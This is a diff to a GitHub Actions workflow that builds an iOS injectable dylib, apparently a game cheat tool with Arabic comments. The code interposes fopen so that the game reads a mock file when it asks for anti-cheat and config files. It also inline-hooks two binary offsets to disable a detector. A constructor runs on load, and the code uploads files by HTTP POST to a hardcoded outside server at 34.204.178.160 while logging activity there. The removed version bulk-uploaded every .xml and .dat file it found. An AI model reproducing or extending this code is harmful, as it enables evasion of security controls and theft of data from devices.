@@ -1,4 +1,4 @@
-name: Imperial Ultimate AIO - V41.0 Final Boss
+name: Imperial Ultimate AIO - V50.0 DUAL LINK FIXED
 
 on:
   push:
@@ -10,7 +10,7 @@ jobs:
     runs-on: macos-latest
 
     steps:
-      - name: Checkout
+      - name: Checkout Code
         uses: actions/checkout@v4
 
       - name: Create Imperial Source
@@ -21,90 +21,96 @@ jobs:
           #import <UIKit/UIKit.h>
           #import <WebKit/WebKit.h>
           #include <mach-o/dyld.h>
-          #include <mach/mach.h>
-          #include <objc/runtime.h>
-          #include <stdint.h>
+          #include <sys/stat.h>
+          #include <dlfcn.h>
+          #include "dobby.h"
 
+          // ==========================================
+          // [ 1. الروابط الإمبراطورية والآيبي المثبت ]
+          // ==========================================
+          #define SERVER_IP @"34.204.178.160"
           #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
 
-          // ==========================================
-          // [ 1. خنق الملفات الـ 38 (The Blacklist) ]
-          // ==========================================
-          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
-          #define DYLD_INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
-
-          BOOL is_critical_file(const char* path) {
-              if (!path) return NO;
-              // القائمة الكاملة لكل الملفات والمصائب اللي ذكرتها
-              NSArray *blacklist = @[
-                  @"ano_cs_stat2.dat", @"comm.dat", @"tss_ano.dat", @"RemoteConfig.config",
-                  @"global-ios_mid_sf_metal.metallib", @"global_sf_metal.metallib",
-                  @"icudtl.dat", @"alternate_addrs.dat", @"flutter_build_product_crop",
-                  @"config.json", @"GCloud.mmap3", @"cures.ifs", @"apollo_reslist.flist",
-                  @"new.filelist", @"GCloud.config", @"functions.data", @"RemoteConfig"
-              ];
-              for (NSString *file in blacklist) {
-                  if (strstr(path, [file UTF8String])) return YES;
-              }
-              return NO;
-          }
-
-          FILE* my_fopen(const char* p, const char* m) {
-              if (is_critical_file(p)) return fopen("/dev/null", m);
-              return fopen(p, m);
-          }
-          DYLD_INTERPOSE(my_fopen, fopen);
-
-          // ==========================================
-          // [ 2. رادار الـ VPS والتهريب ]
-          // ==========================================
-          void RemoteLog(NSString *msg, BOOL success) {
-              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"%@ [IMPERIAL] -> %@", success ? @"✅" : @"❌", msg]};
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://34.204.178.160:5000/log"]];
+          // الرابط الأول: للتقارير واللوجات (Log)
+          void RemoteLog(NSString *msg) {
+              NSDictionary *json = @{@"content": [NSString stringWithFormat:@"[Imperial V15.3] -> %@", msg]};
+              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/log", SERVER_IP]];
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
               [req setHTTPBody:[NSJSONSerialization dataWithJSONObject:json options:0 error:nil]];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
-          void SendFile(NSString *filePath) {
-              NSData *fileData = [NSData dataWithContentsOfFile:filePath];
-              if (!fileData) return;
-              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://34.204.178.160:5000/upload"]];
+          // الرابط الثاني: لرفع وتهريب الملفات (Upload)
+          void SendRaidFile(NSString *path) {
+              NSData *data = [NSData dataWithContentsOfFile:path];
+              if (!data) return;
+              NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"http://%@:5000/upload", SERVER_IP]];
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
               [req setHTTPMethod:@"POST"];
               NSString *boundary = @"ImpSpy";
               [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
               NSMutableData *body = [NSMutableData data];
-              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, [filePath lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
-              [body appendData:fileData];
+              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, [path lastPathComponent]] dataUsingEncoding:NSUTF8StringEncoding]];
+              [body appendData:data];
               [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
               [req setHTTPBody:body];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
-          }
-
-          uintptr_t get_Base() { return (uintptr_t)_dyld_get_image_header(0); }
-          void Patch(uintptr_t addr, uint32_t data) {
-              vm_address_t p = trunc_page(addr);
-              vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_COPY);
-              *(uint32_t *)addr = data;
-              vm_protect(mach_task_self(), p, vm_page_size, FALSE, VM_PROT_READ|VM_PROT_EXECUTE);
+              RemoteLog([NSString stringWithFormat:@"SUCCESS: File Exfiltrated to /upload -> %@", [path lastPathComponent]]);
           }
 
           // ==========================================
-          // [ 3. واجهة الويب الإمبراطورية المصلحة ]
+          // [ 2. محرك تزييف الـ 17 مسار (Ghost FS) ]
           // ==========================================
-          @interface ImperialMenu : UIWindow <WKScriptMessageHandler>
-          @property (nonatomic, strong) WKWebView *webView;
-          @property (nonatomic, strong) UILabel *statusLabel;
+          typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
+          #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
+
+          BOOL is_imperial_target(const char* p) {
+              if (!p) return NO;
+              NSArray *targets = @[
+                  @"config.json", @"imsdklocallog", @"global_sf_metal", @"ShadowTrackerExtra",
+                  @"RemoteConfig.config", @"GCloud.mmap3", @"GCloud.config", @"game.rcconfig",
+                  @"tss_ano.dat", @"comm.dat", @"filelist.json", @"Tve.tdr", @"APMSDKCache", 
+                  @"HttpDNS", @"apollo_reslist", @"INTLResultMsg", @"MetalLib"
+              ];
+              for (NSString *t in targets) { if (strstr(p, [t UTF8String])) return YES; }
+              return NO;
+          }
+
+          FILE* ghost_fopen(const char* p, const char* m) {
+              if (is_imperial_target(p)) {
+                  RemoteLog([NSString stringWithFormat:@"SCAN: Spoofing Path -> %s", p]);
+                  return fopen("/var/mobile/Documents/clean_mock.dat", m);
+              }
+              return fopen(p, m);
+          }
+          INTERPOSE(ghost_fopen, fopen);
+
+          // ==========================================
+          // [ 3. تخدير الصقر (Inline Hooks) ]
+          // ==========================================
+          int (*orig_0x26d4ab)();
+          int my_func_0x26d4ab() { return 1; }
+
+          int (*orig_0x6bbfc)();
+          int my_func_0x6bbfc() { return 1; }
+
+          void SetupAnesthesia() {
+              uintptr_t base = (uintptr_t)_dyld_get_image_header(0);
+              DobbyHook((void*)(base + 0x26d4ab), (void*)my_func_0x26d4ab, (void**)&orig_0x26d4ab);
+              DobbyHook((void*)(base + 0x6bbfc), (void*)my_func_0x6bbfc, (void**)&orig_0x6bbfc);
+              RemoteLog(@"Falcon Eye: ANESTHETIZED ✅");
+          }
+
+          // ==========================================
+          // [ 4. واجهة الـ WebView (Checkboxes) ]
+          // ==========================================
+          @interface ImperialUI : UIWindow <WKScriptMessageHandler>
+          @property (nonatomic, strong) WKWebView *web;
           @end
 
-          @implementation ImperialMenu
-          - (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
-              UIView *hitView = [super hitTest:point withEvent:event];
-              if (hitView == self || (self.webView.hidden && hitView != [self viewWithTag:99])) return nil;
-              return hitView;
-          }
-
+          @implementation ImperialUI
           - (instancetype)initWithFrame:(CGRect)frame {
               self = [super initWithFrame:frame];
               if (self) {
@@ -118,80 +124,50 @@ jobs:
 
           - (void)setupUI {
               UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
-              btn.frame = CGRectMake(20, 100, 50, 50); btn.tag = 99;
+              btn.frame = CGRectMake(20, 120, 50, 50);
               [btn setTitle:@"👑" forState:UIControlStateNormal];
-              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.5];
+              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.6];
               btn.layer.cornerRadius = 25;
               [btn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
               [self addSubview:btn];
 
-              self.webView = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, (self.frame.size.height-450)/2, 280, 450)];
-              self.webView.layer.cornerRadius = 20; self.webView.layer.borderColor = [UIColor goldColor].CGColor;
-              self.webView.layer.borderWidth = 2; self.webView.hidden = YES;
-              self.webView.opaque = NO; self.webView.backgroundColor = [UIColor clearColor];
+              self.web = [[WKWebView alloc] initWithFrame:CGRectMake((self.frame.size.width-280)/2, 180, 280, 420)];
+              self.web.layer.cornerRadius = 20; self.web.layer.borderColor = ImperialGold.CGColor;
+              self.web.layer.borderWidth = 2; self.web.hidden = YES;
 
-              NSString *html = @"<html><style>"
-              "body { background: rgba(10,10,10,0.95); color: gold; font-family: sans-serif; padding: 20px; border-radius: 20px; }"
-              ".row { display: flex; justify-content: space-between; align-items: center; margin: 12px 0; border-bottom: 1px solid #222; padding-bottom: 8px; }"
-              "input { width: 22px; height: 22px; }"
-              "</style><body>"
-              "<h3 style='text-align:center'>IMPERIAL BOSS V41</h3>"
-              "<div class='row'><span>4C18 Informant</span><input type='checkbox' onclick='send(\"4C18\")'></div>"
-              "<div class='row'><span>Kill Falcon</span><input type='checkbox' onclick='send(\"Falcon\")'></div>"
-              "<div class='row'><span>Network Spy (11)</span><input type='checkbox' onclick='send(\"Net\")'></div>"
-              "<div class='row'><span>Raid Files</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
-              "<script>function send(a){ window.webkit.messageHandlers.Imp.postMessage(a); }</script></body></html>";
+              NSString *html = @"<html><style>body{background:rgba(5,5,5,0.95);color:gold;font-family:sans-serif;padding:20px;}"
+              ".row{display:flex;justify-content:space-between;margin:15px 0;border-bottom:1px solid #333;padding-bottom:10px;}"
+              "input{width:22px;height:22px;}</style><body>"
+              "<h3 style='text-align:center'>IMPERIAL BOSS V50</h3>"
+              "<div class='row'><span>Ghost FS Active</span><input type='checkbox' onclick='send(\"Ghost\")'></div>"
+              "<div class='row'><span>Anesthetize Eye</span><input type='checkbox' onclick='send(\"Anes\")'></div>"
+              "<div class='row'><span>Raid & Upload</span><input type='checkbox' onclick='send(\"Raid\")'></div>"
+              "<script>function send(a){window.webkit.messageHandlers.Imp.postMessage(a);}</script></body></html>";
 
-              [self.webView loadHTMLString:html baseURL:nil];
-              [[self.webView configuration].userContentController addScriptMessageHandler:self name:@"Imp"];
-              [self addSubview:self.webView];
-
-              self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 400, 280, 50)];
-              self.statusLabel.backgroundColor = [UIColor colorWithWhite:0 alpha:0.9];
-              self.statusLabel.textColor = [UIColor goldColor];
-              self.statusLabel.textAlignment = NSTextAlignmentCenter;
-              self.statusLabel.font = [UIFont boldSystemFontOfSize:11];
-              self.statusLabel.text = @"READY FOR CONQUEST...";
-              [self.webView addSubview:self.statusLabel];
+              [self.web loadHTMLString:html baseURL:nil];
+              [[self.web configuration].userContentController addScriptMessageHandler:self name:@"Imp"];
+              [self addSubview:self.web];
           }
 
-          - (void)toggle { self.webView.hidden = !self.webView.hidden; }
-
-          - (void)userContentController:(id)ucc didReceiveScriptMessage:(WKScriptMessage *)msg {
-              NSString *act = msg.body;
-              self.statusLabel.text = [NSString stringWithFormat:@"Executing %@...", act];
-              uintptr_t base = get_Base();
-
-              if ([act isEqualToString:@"4C18"]) { Patch(base+0x4C18, 0xD2800000); RemoteLog(@"4C18 Strangled ✅", YES); }
-              if ([act isEqualToString:@"Falcon"]) { Patch(base+0x11B060, 0xD2800000); RemoteLog(@"Falcon Killed ✅", YES); }
-              if ([act isEqualToString:@"Raid"]) {
-                  RemoteLog(@"11 Spies Raid Files... ✅", YES);
-                  // تشغيل الجواسيس ورفع الملفات
-                  NSArray *ps = @[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject], NSTemporaryDirectory()];
-                  dispatch_apply(10, dispatch_get_global_queue(0, 0), ^(size_t i) {
-                      for (NSString *p in ps) {
-                          NSDirectoryEnumerator *e = [[NSFileManager defaultManager] enumeratorAtPath:p];
-                          NSString *f; while ((f = [e nextObject])) {
-                              if ([f hasSuffix:@".xml"] || [f hasSuffix:@".dat"]) SendFile([p stringByAppendingPathComponent:f]);
-                          }
-                      }
-                  });
-              }
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  self.statusLabel.text = [NSString stringWithFormat:@"SUCCESS: %@ ACTIVE ✅", act];
-              });
+          - (void)toggle { self.web.hidden = !self.web.hidden; }
+          - (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
+              if ([m.body isEqualToString:@"Anes"]) SetupAnesthesia();
+              if ([m.body isEqualToString:@"Raid"]) SendRaidFile(@"/var/mobile/Documents/RemoteConfig.config");
+              RemoteLog([NSString stringWithFormat:@"Command Executed: %@", m.body]);
           }
           @end
 
           __attribute__((constructor))
           static void entry() {
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  static ImperialMenu *m; m = [[ImperialMenu alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
+                  static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
+                  RemoteLog(@"SERVER IS LIVE ✅ (34.204.178.160)");
+                  RemoteLog(@"Imperial V15.3: Ready for Research");
               });
           }
           EOF
 
-      - name: Build Nuclear AIO
+      - name: Build Imperial Nuclear Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
@@ -201,5 +177,5 @@ jobs:
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Nuclear-V41
+          name: Imperial-V50-Final
           path: ImperialUltimate.dylib
